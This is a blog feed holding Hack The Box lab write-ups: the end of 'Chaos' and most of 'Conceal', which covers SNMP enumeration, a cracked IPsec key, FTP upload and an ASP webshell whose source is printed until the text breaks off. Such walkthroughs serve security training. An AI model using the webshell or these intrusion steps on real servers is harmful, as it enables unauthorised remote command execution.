&lt;h4 id=&quot;dont-forget-to-read-the-previous-write-ups--tweet-about-the-write-up-if-you-liked-it--follow-on-twitter-for-awesome-resources-ahm3d_h3sham&quot;&gt;Don’t forget to read the &lt;a href=&quot;/categories&quot;&gt;previous write-ups&lt;/a&gt; , Tweet about the write-up if you liked it , follow on twitter for awesome resources &lt;a href=&quot;https://twitter.com/Ahm3d_H3sham&quot;&gt;@Ahm3d_H3sham&lt;/a&gt;&lt;/h4&gt;
&lt;h4 id=&quot;thanks-for-reading&quot;&gt;Thanks for reading.&lt;/h4&gt;
&lt;p&gt;&lt;br /&gt;
&lt;br /&gt;&lt;/p&gt;
&lt;h4 id=&quot;previous-hack-the-box-write-up--hack-the-box---conceal&quot;&gt;Previous Hack The Box write-up : &lt;a href=&quot;/hack-the-box/conceal/&quot;&gt;Hack The Box - Conceal&lt;/a&gt;&lt;/h4&gt;
&lt;h4 id=&quot;next-hack-the-box-write-up--hack-the-box---sizzle&quot;&gt;Next Hack The Box write-up : &lt;a href=&quot;/hack-the-box/sizzle/&quot;&gt;Hack The Box - Sizzle&lt;/a&gt;&lt;/h4&gt;
&lt;hr /&gt;</content><author><name></name></author><category term="Linux" /><category term="Web" /><category term="RCE" /><category term="rbash" /><category term="LaTeX injection" /><category term="Wordpress" /><category term="Cryptography" /><summary type="html">Quick Summary Hey guys today Chaos retired and here’s my write-up about it. Chaos was a CTF-style machine, I can’t say that it simulated a real life situation. I had fun solving this box, some steps were straightforward others were very tricky. About main steps, To get an initial shell as www-data we will exploit a web application that used LaTeX. After that we will escalate privileges to another user and escape rbash. For root privilege escalation we will extract root credentials from a firefox profile and get a root shell. It’s a Linux box and its ip is 10.10.10.120, I added it to /etc/hosts as chaos.htb. Let’s jump right in. Nmap As always we will start with nmap to scan for open ports and services : nmap -sV -sT -sC chaos.htb We got some ports. http on port 80 and 10000, email related services (imap, pop3) running on ports 110, 143, 993 and 995. Let’s check http. HTTP Initial Enumeration Port 10000 gave me this error : So I switched to https and got a login form : We don’t have any credentials and I ran gobuster and got nothing interesting so we will ignore this and look at port 80. It’s just a normal website, rest of it : I checked that contact form and it’s doing nothing. I ran gobuster on chaos.htb and got these results : ===================================================== Gobuster v2.0.0 OJ Reeves (@TheColonial) ===================================================== [+] Mode : dir [+] Url/Domain : http://chaos.htb/ [+] Threads : 10 [+] Wordlist : /usr/share/wordlists/dirb/common.txt [+] Status codes : 200,204,301,302,307,403 [+] Timeout : 10s ===================================================== 2019/05/24 14:36:56 Starting gobuster ===================================================== /.hta (Status: 403) /.htaccess (Status: 403) /.htpasswd (Status: 403) /css (Status: 301) /img (Status: 301) /index.html (Status: 200) /javascript (Status: 301) /js (Status: 301) /server-status (Status: 403) /source (Status: 301) ===================================================== 2019/05/24 14:40:36 Finished ===================================================== And now this part is tricky. Because going to the ip of the box 10.10.10.120 instead of chaos.htb will give us a different thing (virtual hosting). It’s saying Direct IP not allowed. I ran another gobuster scan on the ip and got different results : ===================================================== Gobuster v2.0.0 OJ Reeves (@TheColonial) ===================================================== [+] Mode : dir [+] Url/Domain : http://10.10.10.120/ [+] Threads : 10 [+] Wordlist : /usr/share/wordlists/dirb/common.txt [+] Status codes : 200,204,301,302,307,403 [+] Timeout : 10s ===================================================== 2019/05/24 14:41:52 Starting gobuster ===================================================== /.hta (Status: 403) /.htaccess (Status: 403) /.htpasswd (Status: 403) /index.html (Status: 200) /javascript (Status: 301) /server-status (Status: 403) /wp (Status: 301) ===================================================== 2019/05/24 14:45:37 Finished ===================================================== On chaos.htb the thing the caught my attention was /source so I checked that and it didn’t have anything : I checked http://10.10.10.120/wp and found a wordpress website : I looked at the posts, there was only one post and it was password protected : I clicked on the post link and saw that the author of the post is called human : Before trying to bruteforce the password I tried some basic stuff first and the username:username type of credentials worked. The password was human : And we got some credentials for mail : ayush:jiujitsu Accessing the e-mail Service, Decrypting Secret Message We saw earlier some email services running on the machine. Now we have credentials to access these services. To do that we will use an email client, I used claws-mail (can be installed with apt) and configured it like this : Inbox was empty but drafts had something : ``` From: ayush ayush@localhost To: undisclosed-recipients:; Subject: service Date: Sun, 28 Oct 2018 17:46:38 +0530 User-Agent: Roundcube Webmail/1.3.8</summary><media:thumbnail xmlns:media="http://search.yahoo.com/mrss/" url="http://localhost:4000/hackthebox/chaos/0.png" /></entry><entry><title type="html">Hack The Box - Conceal</title><link href="http://localhost:4000/hack-the-box/conceal/" rel="alternate" type="text/html" title="Hack The Box - Conceal" /><published>2019-05-18T00:00:00+02:00</published><updated>2019-05-18T00:00:00+02:00</updated><id>http://localhost:4000/hack-the-box/conceal</id><content type="html" xml:base="http://localhost:4000/hack-the-box/conceal/">&lt;hr /&gt;

&lt;h3 id=&quot;quick-summary&quot;&gt;Quick Summary&lt;/h3&gt;
&lt;h4 id=&quot;hey-guys-today-conceal-retired-and-heres-my-write-up-about-it-conceal-was-a-straightforward-fun-box-the-only-tricky-part-about-it-is-gaining-ipsec-connection-to-gain-access-to-some-filtered-services-that-first-part-involved-some-guessing-but-after-that-everything-is-simple-and-very-straightforward-i-liked-this-machine-and-it-was-a-very-fun-one-its-a-windows-machine-and-its-ip-is-101010116-i-added-it-to-etchosts-as-concealhtb-lets-jump-right-in&quot;&gt;Hey guys today Conceal retired and here’s my write-up about it. Conceal was a straightforward fun box, The only tricky part about it is gaining &lt;a href=&quot;https://en.wikipedia.org/wiki/IPsec&quot;&gt;IPSEC&lt;/a&gt; connection to gain access to some filtered services. That first part involved some guessing but after that everything is simple and very straightforward. I liked this machine and it was a very fun one. It’s a windows machine and its ip is &lt;code class=&quot;highlighter-rouge&quot;&gt;10.10.10.116&lt;/code&gt;, I added it to &lt;code class=&quot;highlighter-rouge&quot;&gt;/etc/hosts&lt;/code&gt; as &lt;code class=&quot;highlighter-rouge&quot;&gt;conceal.htb&lt;/code&gt;. Let’s jump right in.&lt;/h4&gt;
&lt;p&gt;&lt;img src=&quot;/images/hackthebox/conceal/0.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;hr /&gt;

&lt;h3 id=&quot;nmap&quot;&gt;Nmap&lt;/h3&gt;
&lt;h4 id=&quot;as-always-we-will-start-with-nmap-to-scan-for-open-ports-and-services&quot;&gt;As always we will start with &lt;code class=&quot;highlighter-rouge&quot;&gt;nmap&lt;/code&gt; to scan for open ports and services.&lt;/h4&gt;
&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;nmap -sV -sT -sC conceal.htb&lt;/code&gt;
&lt;img src=&quot;/images/hackthebox/conceal/1.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h4 id=&quot;and-we-got-nothing-&quot;&gt;And we got nothing !&lt;/h4&gt;
&lt;h4 id=&quot;i-ran-another-nmap-udp-scan-on-all-ports-&quot;&gt;I ran another &lt;code class=&quot;highlighter-rouge&quot;&gt;nmap&lt;/code&gt; UDP scan on all ports :&lt;/h4&gt;
&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;nmap -vvv -sU -o nmapudp conceal.htb --max-retries 0&lt;/code&gt;&lt;/p&gt;
&lt;h4 id=&quot;the-output-was-too-long-so-i-will-show-the-only-important-part-&quot;&gt;The output was too long so I will show the only important part :&lt;/h4&gt;
&lt;p&gt;&lt;img src=&quot;/images/hackthebox/conceal/2.png&quot; alt=&quot;&quot; /&gt;
&lt;br /&gt;
&lt;br /&gt;
&lt;img src=&quot;/images/hackthebox/conceal/3.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h4 id=&quot;it-was-not-sure-about-port-161-but-it-showed-that-port-500-is-open&quot;&gt;It was not sure about port 161, but it showed that port 500 is open.&lt;/h4&gt;
&lt;h4 id=&quot;i-ran-a-third-scan-on-ports-500-and-161-&quot;&gt;I ran a third scan on ports 500 and 161 :&lt;/h4&gt;
&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;nmap -p 161,500 -sV -sU -sC conceal.htb&lt;/code&gt;
&lt;img src=&quot;/images/hackthebox/conceal/4.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h4 id=&quot;full-output-&quot;&gt;Full Output :&lt;/h4&gt;
&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;# Nmap 7.70 scan initiated Fri May 17 16:37:52 2019 as: nmap -p 161,500 -sV -sU -sC -o nmapudp2 conceal.htb
Nmap scan report for conceal.htb (10.10.10.116)
Host is up (0.20s latency).

PORT    STATE SERVICE VERSION
161/udp open  snmp    SNMPv1 server (public)
| snmp-interfaces: 
|   Software Loopback Interface 1\x00
|     IP address: 127.0.0.1  Netmask: 255.0.0.0
|     Type: softwareLoopback  Speed: 1 Gbps
|     Traffic stats: 0.00 Kb sent, 0.00 Kb received
|   Intel(R) 82574L Gigabit Network Connection\x00
|     IP address: 10.10.10.116  Netmask: 255.255.255.0
|     MAC address: 00:50:56:b9:55:a7 (VMware)
|     Type: ethernetCsmacd  Speed: 1 Gbps
|     Traffic stats: 399.03 Kb sent, 6.41 Mb received
|   Intel(R) 82574L Gigabit Network Connection-WFP Native MAC Layer LightWeight Filter-0000\x00
|     MAC address: 00:50:56:b9:55:a7 (VMware)
|     Type: ethernetCsmacd  Speed: 1 Gbps
|     Traffic stats: 399.03 Kb sent, 6.41 Mb received
|   Intel(R) 82574L Gigabit Network Connection-QoS Packet Scheduler-0000\x00
|     MAC address: 00:50:56:b9:55:a7 (VMware)
|     Type: ethernetCsmacd  Speed: 1 Gbps
|     Traffic stats: 399.03 Kb sent, 6.41 Mb received
|   Intel(R) 82574L Gigabit Network Connection-WFP 802.3 MAC Layer LightWeight Filter-0000\x00
|     MAC address: 00:50:56:b9:55:a7 (VMware)
|     Type: ethernetCsmacd  Speed: 1 Gbps
|_    Traffic stats: 399.03 Kb sent, 6.41 Mb received
| snmp-netstat: 
|   TCP  0.0.0.0:21           0.0.0.0:0
|   TCP  0.0.0.0:80           0.0.0.0:0
|   TCP  0.0.0.0:135          0.0.0.0:0
|   TCP  0.0.0.0:445          0.0.0.0:0
|   TCP  0.0.0.0:49664        0.0.0.0:0
|   TCP  0.0.0.0:49665        0.0.0.0:0
|   TCP  0.0.0.0:49666        0.0.0.0:0
|   TCP  0.0.0.0:49667        0.0.0.0:0
|   TCP  0.0.0.0:49668        0.0.0.0:0
|   TCP  0.0.0.0:49669        0.0.0.0:0
|   TCP  0.0.0.0:49670        0.0.0.0:0
|   TCP  10.10.10.116:139     0.0.0.0:0
|   UDP  0.0.0.0:123          *:*
|   UDP  0.0.0.0:161          *:*
|   UDP  0.0.0.0:500          *:*
|   UDP  0.0.0.0:4500         *:*
|   UDP  0.0.0.0:5050         *:*
|   UDP  0.0.0.0:5353         *:*
|   UDP  0.0.0.0:5355         *:*
|   UDP  10.10.10.116:137     *:*
|   UDP  10.10.10.116:138     *:*
|   UDP  10.10.10.116:1900    *:*
|   UDP  10.10.10.116:65496   *:*
|   UDP  127.0.0.1:1900       *:*
|_  UDP  127.0.0.1:65497      *:*
| snmp-processes: 
|   1: 
|     Name: System Idle Process
|   4: 
|     Name: System
|   308: 
|     Name: smss.exe
|   348: 
|     Name: svchost.exe
|     Path: C:\Windows\System32\
|     Params: -k LocalSystemNetworkRestricted
|   392: 
|     Name: csrss.exe
|   468: 
|     Name: svchost.exe
|     Path: C:\Windows\system32\
|     Params: -k LocalService
|   472: 
|     Name: wininit.exe
|   484: 
|     Name: csrss.exe
|   564: 
|     Name: winlogon.exe
|   584: 
|     Name: services.exe
|   616: 
|     Name: lsass.exe
|     Path: C:\Windows\system32\
|   696: 
|     Name: fontdrvhost.exe
|   704: 
|     Name: fontdrvhost.exe
|   712: 
|     Name: svchost.exe
|     Path: C:\Windows\system32\
|     Params: -k DcomLaunch
|   812: 
|     Name: svchost.exe
|     Path: C:\Windows\system32\
|     Params: -k RPCSS
|   900: 
|     Name: svchost.exe
|     Path: C:\Windows\System32\
|     Params: -k NetworkService
|   908: 
|     Name: dwm.exe
|   940: 
|     Name: svchost.exe
|     Path: C:\Windows\system32\
|     Params: -k netsvcs
|   976: 
|     Name: svchost.exe
|     Path: C:\Windows\System32\
|     Params: -k LocalServiceNetworkRestricted
|   984: 
|     Name: svchost.exe
|     Path: C:\Windows\system32\
|     Params: -k LocalServiceNoNetwork
|   1140: 
|     Name: vmacthlp.exe
|     Path: C:\Program Files\VMware\VMware Tools\
|   1232: 
|     Name: svchost.exe
|     Path: C:\Windows\System32\
|     Params: -k LocalServiceNetworkRestricted
|   1248: 
|     Name: svchost.exe
|     Path: C:\Windows\system32\
|     Params: -k LocalSystemNetworkRestricted
|   1292: 
|     Name: LogonUI.exe
|     Params:  /flags:0x0 /state0:0xa3a2c855 /state1:0x41c64e6d
|   1392: 
|     Name: svchost.exe
|     Path: C:\Windows\system32\
|     Params: -k LocalServiceNetworkRestricted
|   1400: 
|     Name: svchost.exe
|     Path: C:\Windows\System32\
|     Params: -k LocalServiceNetworkRestricted
|   1492: 
|     Name: spoolsv.exe
|     Path: C:\Windows\System32\
|   1728: 
|     Name: svchost.exe
|     Path: C:\Windows\system32\
|     Params: -k apphost
|   1748: 
|     Name: svchost.exe
|     Path: C:\Windows\System32\
|     Params: -k utcsvc
|   1788: 
|     Name: svchost.exe
|     Path: C:\Windows\system32\
|     Params: -k ftpsvc
|   1856: 
|     Name: SecurityHealthService.exe
|   1868: 
|     Name: snmp.exe
|     Path: C:\Windows\System32\
|   1892: 
|     Name: VGAuthService.exe
|     Path: C:\Program Files\VMware\VMware Tools\VMware VGAuth\
|   1912: 
|     Name: vmtoolsd.exe
|     Path: C:\Program Files\VMware\VMware Tools\
|   1932: 
|     Name: ManagementAgentHost.exe
|     Path: C:\Program Files\VMware\VMware Tools\VMware CAF\pme\bin\
|   1956: 
|     Name: svchost.exe
|     Path: C:\Windows\system32\
|     Params: -k iissvcs
|   1980: 
|     Name: MsMpEng.exe
|   2068: 
|     Name: Memory Compression
|   2204: 
|     Name: svchost.exe
|     Path: C:\Windows\system32\
|     Params: -k LocalServiceAndNoImpersonation
|   2444: 
|     Name: svchost.exe
|     Path: C:\Windows\system32\
|     Params: -k NetworkServiceNetworkRestricted
|   2952: 
|     Name: WmiPrvSE.exe
|     Path: C:\Windows\system32\wbem\
|   2976: 
|     Name: NisSrv.exe
|   3052: 
|     Name: dllhost.exe
|     Path: C:\Windows\system32\
|     Params: /Processid:{02D4B3F1-FD88-11D1-960D-00805FC79235}
|   3132: 
|     Name: SearchIndexer.exe
|     Path: C:\Windows\system32\
|     Params: /Embedding
|   3280: 
|     Name: svchost.exe
|     Path: C:\Windows\system32\
|     Params: -k appmodel
|   3376: 
|     Name: msdtc.exe
|     Path: C:\Windows\System32\
|   3948: 
|     Name: svchost.exe
|   5004: 
|     Name: SearchFilterHost.exe
|     Path: C:\Windows\system32\
|     Params:  0 700 704 712 8192 708 
|   5032: 
|     Name: SearchProtocolHost.exe
|     Path: C:\Windows\system32\
|_    Params:  Global\UsGthrFltPipeMssGthrPipe23_ Global\UsGthrCtrlFltPipeMssGthrPipe23 1 -2147483646 &quot;Software\Microsoft\Windows Search&quot; &quot;Moz
| snmp-sysdescr: Hardware: Intel64 Family 6 Model 79 Stepping 1 AT/AT COMPATIBLE - Software: Windows Version 6.3 (Build 15063 Multiprocessor Free)
|_  System uptime: 2h08m26.61s (770661 timeticks)
| snmp-win32-services: 
|   Application Host Helper Service
|   Background Intelligent Transfer Service
|   Background Tasks Infrastructure Service
|   Base Filtering Engine
|   CNG Key Isolation
|   COM+ Event System
|   COM+ System Application
|   Client License Service (ClipSVC)
|   Connected Devices Platform Service
|   Connected User Experiences and Telemetry
|   CoreMessaging
|   Cryptographic Services
|   DCOM Server Process Launcher
|   DHCP Client
|   DNS Client
|   Data Sharing Service
|   Data Usage
|   Device Setup Manager
|   Diagnostic Policy Service
|   Diagnostic Service Host
|   Distributed Link Tracking Client
|   Distributed Transaction Coordinator
|   Geolocation Service
|   Group Policy Client
|   IKE and AuthIP IPsec Keying Modules
|   IP Helper
|   IPsec Policy Agent
|   Local Session Manager
|   Microsoft Account Sign-in Assistant
|   Microsoft FTP Service
|   Network Connection Broker
|   Network List Service
|   Network Location Awareness
|   Network Store Interface Service
|   Plug and Play
|   Power
|   Print Spooler
|   Program Compatibility Assistant Service
|   RPC Endpoint Mapper
|   Remote Procedure Call (RPC)
|   SNMP Service
|   SSDP Discovery
|   Security Accounts Manager
|   Security Center
|   Server
|   Shell Hardware Detection
|   State Repository Service
|   Storage Service
|   Superfetch
|   System Event Notification Service
|   System Events Broker
|   TCP/IP NetBIOS Helper
|   Task Scheduler
|   Themes
|   Tile Data model server
|   Time Broker
|   TokenBroker
|   User Manager
|   User Profile Service
|   VMware Alias Manager and Ticket Service
|   VMware CAF Management Agent Service
|   VMware Physical Disk Helper Service
|   VMware Tools
|   WinHTTP Web Proxy Auto-Discovery Service
|   Windows Audio
|   Windows Audio Endpoint Builder
|   Windows Connection Manager
|   Windows Defender Antivirus Network Inspection Service
|   Windows Defender Antivirus Service
|   Windows Defender Security Centre Service
|   Windows Driver Foundation - User-mode Driver Framework
|   Windows Event Log
|   Windows Firewall
|   Windows Font Cache Service
|   Windows Management Instrumentation
|   Windows Process Activation Service
|   Windows Push Notifications System Service
|   Windows Search
|   Windows Time
|   Workstation
|_  World Wide Web Publishing Service
| snmp-win32-software: 
|   Microsoft Visual C++ 2008 Redistributable - x64 9.0.30729.6161; 2018-10-12T20:10:30
|   Microsoft Visual C++ 2008 Redistributable - x86 9.0.30729.6161; 2018-10-12T20:10:22
|_  VMware Tools; 2018-10-12T20:11:02
| snmp-win32-users: 
|   Administrator
|   DefaultAccount
|   Destitute
|_  Guest
500/udp open  isakmp  Microsoft Windows 8
| ike-version: 
|   vendor_id: Microsoft Windows 8
|   attributes: 
|     MS NT5 ISAKMPOAKLEY
|     RFC 3947 NAT-T
|     draft-ietf-ipsec-nat-t-ike-02\n
|     IKE FRAGMENTATION
|     MS-Negotiation Discovery Capable
|_    IKE CGA version 1
Service Info: Host: Conceal; OS: Windows 8; CPE: cpe:/o:microsoft:windows:8, cpe:/o:microsoft:windows

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Fri May 17 16:42:05 2019 -- 1 IP address (1 host up) scanned in 253.58 seconds
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;h4 id=&quot;we-have-two-services-to-enumerate-isakmp-which-is-ipsec-and-snmp&quot;&gt;We have two services to enumerate. &lt;code class=&quot;highlighter-rouge&quot;&gt;isakmp&lt;/code&gt; which is &lt;code class=&quot;highlighter-rouge&quot;&gt;IPSEC&lt;/code&gt; and &lt;code class=&quot;highlighter-rouge&quot;&gt;snmp&lt;/code&gt;.&lt;/h4&gt;
&lt;p&gt;&lt;br /&gt;&lt;/p&gt;
&lt;hr /&gt;

&lt;h3 id=&quot;snmp-enumeration&quot;&gt;Snmp Enumeration&lt;/h3&gt;
&lt;h4 id=&quot;i-started-with-snmpwalk-&quot;&gt;I started with &lt;code class=&quot;highlighter-rouge&quot;&gt;snmpwalk&lt;/code&gt; :&lt;/h4&gt;
&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;snmpwalk -c public -v 1 conceal.htb&lt;/code&gt;&lt;/p&gt;
&lt;h4 id=&quot;the-output-was-very-long-but-we-only-need-this-first-part-&quot;&gt;The output was very long but we only need this first part :&lt;/h4&gt;
&lt;p&gt;&lt;img src=&quot;/images/hackthebox/conceal/5.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h4 id=&quot;we-have-a-password-hash-for-the-ipsec-connection--9c8b1a372b1878851be2c097031b6e43&quot;&gt;We have a password hash for the &lt;code class=&quot;highlighter-rouge&quot;&gt;IPSEC&lt;/code&gt; connection : &lt;code class=&quot;highlighter-rouge&quot;&gt;9C8B1A372B1878851BE2C097031B6E43&lt;/code&gt;&lt;/h4&gt;
&lt;h4 id=&quot;i-used-crackstation-to-crack-it-and-i-got-this-result-&quot;&gt;I used &lt;a href=&quot;https://crackstation.net/&quot;&gt;crackstation&lt;/a&gt; to crack it and I got this result :&lt;/h4&gt;
&lt;p&gt;&lt;img src=&quot;/images/hackthebox/conceal/6.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h4 id=&quot;great--now-we-need-to-enumerate-the-ike-vpn-service-to-know-how-to-connect-to-it&quot;&gt;Great ! Now we need to enumerate the &lt;code class=&quot;highlighter-rouge&quot;&gt;ike&lt;/code&gt; vpn service to know how to connect to it.&lt;/h4&gt;
&lt;p&gt;&lt;br /&gt;&lt;/p&gt;
&lt;hr /&gt;

&lt;h3 id=&quot;ike-scan-setting-up-the-connection&quot;&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;ike-scan&lt;/code&gt;, Setting up The Connection&lt;/h3&gt;
&lt;h4 id=&quot;i-ran-ike-scan-and-got-these-results-&quot;&gt;I ran &lt;code class=&quot;highlighter-rouge&quot;&gt;ike-scan&lt;/code&gt; and got these results :&lt;/h4&gt;
&lt;p&gt;&lt;img src=&quot;/images/hackthebox/conceal/7.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h4 id=&quot;i-installed-strongswan-to-set-up-the-ipsec-connection-with-the-help-of-the-info-i-got-from-ike-scan-and-some-guessing-i-could-come-up-with-this-configuration-which-worked-&quot;&gt;I installed &lt;code class=&quot;highlighter-rouge&quot;&gt;strongswan&lt;/code&gt; to set up the &lt;code class=&quot;highlighter-rouge&quot;&gt;IPSEC&lt;/code&gt; connection. With the help of the info I got from &lt;code class=&quot;highlighter-rouge&quot;&gt;ike-scan&lt;/code&gt; and some guessing I could come up with this configuration which worked :&lt;/h4&gt;
&lt;p&gt;&lt;br /&gt;
&lt;code class=&quot;highlighter-rouge&quot;&gt;/etc/ipsec.conf&lt;/code&gt; :
&lt;img src=&quot;/images/hackthebox/conceal/8.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;conn rick-to-conceal
        authby=secret
        auto=route
        keyexchange=ikev1
        ike=3des-sha1-modp1024
        left=10.10.xx.xx
        right=10.10.10.116
        type=transport
        esp=3des-sha1
        rightprotoport=tcp
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;p&gt;&lt;br /&gt;
&lt;br /&gt;
&lt;code class=&quot;highlighter-rouge&quot;&gt;/etc/ipsec.secrets&lt;/code&gt; :
&lt;img src=&quot;/images/hackthebox/conceal/9.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;10.10.xx.xx 10.10.10.116 : PSK &quot;Dudecake1!&quot;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;h4 id=&quot;i-started-ipsec-then-i-initialized-the-connection-&quot;&gt;I started &lt;code class=&quot;highlighter-rouge&quot;&gt;ipsec&lt;/code&gt; then I initialized the connection :&lt;/h4&gt;
&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;ipsec start&lt;/code&gt;
&lt;br /&gt;
&lt;br /&gt;
&lt;code class=&quot;highlighter-rouge&quot;&gt;ipsec up rick-to-conceal&lt;/code&gt;
&lt;img src=&quot;/images/hackthebox/conceal/10.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h4 id=&quot;it-worked-fine-now-we-are-connected-to-a-vpn-network-lets-see-what-new-services-can-we-get&quot;&gt;It worked fine, now we are connected to a vpn network let’s see what new services can we get.&lt;/h4&gt;
&lt;p&gt;&lt;br /&gt;&lt;/p&gt;
&lt;hr /&gt;

&lt;h3 id=&quot;nmap-second-time&quot;&gt;Nmap (Second Time)&lt;/h3&gt;
&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;nmap -sV -sT -sC conceal.htb&lt;/code&gt;
&lt;img src=&quot;/images/hackthebox/conceal/11.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h4 id=&quot;we-got-ftp-on-port-21--http-on-port-80-and-smb-on-port-445-i-wanted-to-check-ftp-first-and-see-if-i-can-authenticate-anonymously&quot;&gt;We got ftp on port 21 , http on port 80 and smb on port 445. I wanted to check ftp first and see if I can authenticate anonymously.&lt;/h4&gt;
&lt;hr /&gt;

&lt;h3 id=&quot;ftp-file-upload-reverse-shell-and-user-flag&quot;&gt;FTP, File Upload, Reverse Shell and User Flag&lt;/h3&gt;
&lt;p&gt;&lt;img src=&quot;/images/hackthebox/conceal/12.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h4 id=&quot;it-worked-but-there-was-literally-nothing-on-that-ftp-server-i-uploaded-a-test-file-to-check-if-i-have-write-permissions-on-that-ftp-server-and-i-had&quot;&gt;It worked but there was literally nothing on that ftp server. I uploaded a test file to check if I have write permissions on that ftp server and I had.&lt;/h4&gt;
&lt;p&gt;&lt;img src=&quot;/images/hackthebox/conceal/13.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h4 id=&quot;i-checked-the-http-service-and-there-was-only-the-default-iis-page-&quot;&gt;I Checked the http service and there was only the default IIS page :&lt;/h4&gt;
&lt;p&gt;&lt;img src=&quot;/images/hackthebox/conceal/14.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h4 id=&quot;i-ran-gobuster-with-usrsharewordlistsdirbcommontxt-and-got-only-one-directory-called-upload-&quot;&gt;I ran &lt;code class=&quot;highlighter-rouge&quot;&gt;gobuster&lt;/code&gt; with &lt;code class=&quot;highlighter-rouge&quot;&gt;/usr/share/wordlists/dirb/common.txt&lt;/code&gt; and got only one directory called &lt;code class=&quot;highlighter-rouge&quot;&gt;/upload&lt;/code&gt; :&lt;/h4&gt;
&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;gobuster -u http://conceal.htb/ -w /usr/share/wordlists/dirb/common.txt

=====================================================
Gobuster v2.0.0              OJ Reeves (@TheColonial)
=====================================================
[+] Mode         : dir
[+] Url/Domain   : http://conceal.htb/
[+] Threads      : 10
[+] Wordlist     : /usr/share/wordlists/dirb/common.txt
[+] Status codes : 200,204,301,302,307,403
[+] Timeout      : 10s
=====================================================
2019/05/17 17:18:57 Starting gobuster
=====================================================
/upload (Status: 301)
=====================================================
2019/05/17 17:28:23 Finished
=====================================================
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;h4 id=&quot;i-went-to-upload-and-found-my-test-file-&quot;&gt;I went to &lt;code class=&quot;highlighter-rouge&quot;&gt;/upload&lt;/code&gt; and found my test file :&lt;/h4&gt;
&lt;p&gt;&lt;img src=&quot;/images/hackthebox/conceal/15.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h4 id=&quot;great--i-uploaded-an-asp-shell-to-get-remote-code-execution-&quot;&gt;Great ! I uploaded an &lt;code class=&quot;highlighter-rouge&quot;&gt;asp&lt;/code&gt; shell to get remote code execution :&lt;/h4&gt;
&lt;p&gt;&lt;img src=&quot;/images/hackthebox/conceal/16.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h4 id=&quot;shellasp-&quot;&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;shell.asp&lt;/code&gt; :&lt;/h4&gt;
&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&amp;lt;!--
ASP Webshell
Working on latest IIS 
Referance :- 
https://github.com/tennc/webshell/blob/master/fuzzdb-webshell/asp/cmd.asp
http://stackoverflow.com/questions/11501044/i-need-execute-a-command-line-in-a-visual-basic-script
http://www.w3schools.com/asp/
--&amp;gt;


&amp;lt;%
Set oScript = Server.CreateObject(&quot;WSCRIPT.SHELL&quot;)
Set oScriptNet = Server.CreateObject(&quot;WSCRIPT.NETWORK&quot;)
Set oFileSys = Server.CreateObject(&quot;Scripting.FileSystemObject&quot;)
Function getCommandOutput(theCommand)
    Dim objShell, objCmdExec
    Set objShell = CreateObject(&quot;WScript.Shell&quot;)
    Set objCmdExec = objshell.exec(thecommand)
    getCommandOutput = objCmdExec.StdOut.ReadAll
end Function
%&amp;gt;


&amp;lt;HTML&amp;gt;
&amp;lt;BODY&amp;gt;
&amp;lt;FORM action=&quot;&quot; method=&quot;GET&quot;&amp;gt;
&amp;lt;input type=&quot;text&quot; name=&quot;cmd&quot; size=45 value=&quot;&amp;lt;%= szCMD %&amp;gt;&quot;&amp;gt;
&amp;lt;input type=&quot;submit&quot; value=&quot;Run&quot;&amp;gt;
&amp;lt;/FORM&amp;gt;
&amp;lt;PRE&amp;gt;
&amp;lt;%= &quot;\\&quot; &amp;amp; oScriptNet.ComputerName &amp;amp; &quot;\&quot; &amp;amp; oScriptNet.UserName %&amp;gt;
&amp;lt;%Response.Write(Request.ServerVariables(&quot;server_name&quot;))%&amp;gt;
&amp;lt;p&amp;gt;
&amp;lt;b&amp;gt;The server's port:&amp;lt;/b&amp;gt;
&amp;lt;%Response.Write(Request.ServerVariables(&quot;server_port&quot;))%&amp;gt;
&amp;lt;/p&amp;gt;
&amp;lt;p&amp;gt;
&amp;lt;b&amp;gt;The server's software:&amp;lt;/b&amp;gt;
